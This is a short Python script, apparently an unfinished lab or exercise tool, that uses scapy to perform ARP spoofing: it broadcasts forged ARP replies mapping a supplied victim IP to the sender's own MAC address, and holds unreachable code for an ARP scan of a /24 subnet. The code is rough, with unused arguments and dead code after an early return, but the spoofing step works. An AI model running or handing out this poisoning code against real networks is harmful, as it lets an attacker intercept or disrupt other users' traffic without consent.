#!/usr/bin/env python3
from scapy.all import *


def spoof(ip, hwsrc):            
    arp=ARP(op=2,psrc=ip,hwsrc=hwsrc)
    eth=Ether(dst="ff:ff:ff:ff:ff:ff",src=hwsrc)
    pkt = eth/arp
    ans=srp1(pkt,timeout=1)
    return ans

def get_mac(ip):
    arp=ARP(op=1,pdst=ip)
    eth = Ether(dst = "ff:ff:ff:ff:ff:ff")
    pkt = eth/arp
    ans = srp1(pkt, timeout = 1, verbose = False)
    return ans
 
def main():
    if __name__ == '__main__':
        import argparse
        parser = argparse.ArgumentParser()
        parser.add_argument('--interface', required=True)
        parser.add_argument('--victim-ip', required=True)
        parser.add_argument('--victim-ethernet', required=True)
        parser.add_argument('--reflector-ip', required=True)
        parser.add_argument('--reflector-ethernet', required=True)
        args=parser.parse_args()
        print(args)
        
   

    own_mac = get_if_hwaddr(args.interface)
    spoof(args.victim_ip, own_mac)
    return
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.0/24")
    ans, unans = srp(pkt, timeout=2)
    ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%") )

main()